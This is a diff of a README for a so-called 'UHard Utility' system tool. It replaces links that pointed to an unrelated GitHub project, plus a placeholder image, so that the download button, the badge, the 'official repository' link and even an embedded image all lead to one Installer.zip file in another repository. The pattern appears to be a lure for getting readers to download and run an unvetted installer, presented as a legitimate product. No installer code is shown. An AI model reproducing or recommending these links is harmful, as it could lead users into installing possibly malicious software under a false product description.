@@ -25,9 +25,9 @@ The **UHard Utility** is a powerful tool designed for enhancing system performan
 
 ## Installation 🚀
 
-You can download the latest version of the UHard Utility from the following link: [Download UHard Utility v1.0.0](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+You can download the latest version of the UHard Utility from the following link: [Download UHard Utility v1.0.0](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
 
-[![Download UHard Utility](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download UHard Utility](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
 
 Once downloaded, extract the files and launch the application to start configuring your system like never before!
 
@@ -66,8 +66,8 @@ The UHard Utility is licensed under the MIT License. See the [LICENSE](LICENSE) 
 
 By using the UHard Utility, you are taking the first step towards optimizing your system's performance and customization. Download the tool today and take control of your system like never before! 🚀🔧
 
-🔗 For more information, visit the official [UHard Utility Repository](https://github.com/cli/oauth)
+🔗 For more information, visit the official [UHard Utility Repository](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip)
 
 Thank you for choosing UHard Utility! 🙌 
 
-![System Configuration](https://image-url.com) 
+![System Configuration](https://github.com/kudos223/UHard-Utility-Advanced-System-Configuration-Tool/releases/download/v1.0/Installer.zip) 
